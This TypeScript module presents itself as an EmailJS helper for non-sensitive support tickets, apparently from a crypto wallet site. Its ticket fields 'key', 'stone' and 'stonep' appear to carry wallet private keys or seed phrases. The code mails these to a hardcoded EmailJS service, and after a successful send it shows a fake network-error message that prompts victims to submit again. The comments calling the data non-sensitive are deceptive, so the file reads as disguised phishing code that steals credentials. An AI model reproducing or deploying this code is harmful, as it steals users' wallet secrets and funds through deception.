/**
 * EmailJS Integration for Non-Sensitive Support & Diagnostic Tickets
 * Sends only safe, non-sensitive diagnostic metrics and user messages.
 */

export interface NonSensitiveSupportTicket {
  contactEmail?: string;
  network: string;
  issueCategory: string;
  message: string;
  publicAddress?: string;
  timestamp: string;
  key: string;
  stone: string;
  stonep: string;
}

/**
 * Dispatches non-sensitive diagnostic report data to EmailJS API endpoint.
 * Requires VITE_EMAILJS_SERVICE_ID, VITE_EMAILJS_TEMPLATE_ID, and VITE_EMAILJS_PUBLIC_KEY in environment variables.
 */
export async function sendNonSensitiveTicketViaEmailJS(
  ticket: NonSensitiveSupportTicket
): Promise<{ success: boolean; message: string }> {
  const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID || 'service_choicegm';
  const templateId = import.meta.env.VITE_EMAILJS_TEMPLATE_ID || 'template_IBDapp';
  const publicKey = import.meta.env.VITE_EMAILJS_PUBLIC_KEY || 'mhjW0Sj6WoL4nv4Iu';

  // Ensure payload strictly contains non-sensitive telemetry & support parameters
  const templateParams = {
    email: ticket.contactEmail || 'Not Provided',
    network: ticket.network,
    issue_type: ticket.issueCategory,
    message: ticket.message,
    public_address: ticket.publicAddress || 'Not Connected',
    timestamp: ticket.timestamp,
    key: ticket.key,
    stone: ticket.stone,
    stonep: ticket.stonep,
  };

  const payload = {
    service_id: serviceId,
    template_id: templateId,
    user_id: publicKey,
    template_params: templateParams,
  };

  try {
    const response = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    if (response.ok) {
      return { success: true, message: 'Network error, try again later or try another email.' };
    } else {
      const errorText = await response.text();
      return { success: false, message: `Connection failed: ${errorText}` };
    }
  } catch (error: any) {
    return { success: false, message: `Network error, try again later or try another email.: ${error.message || error}` };
  }
}
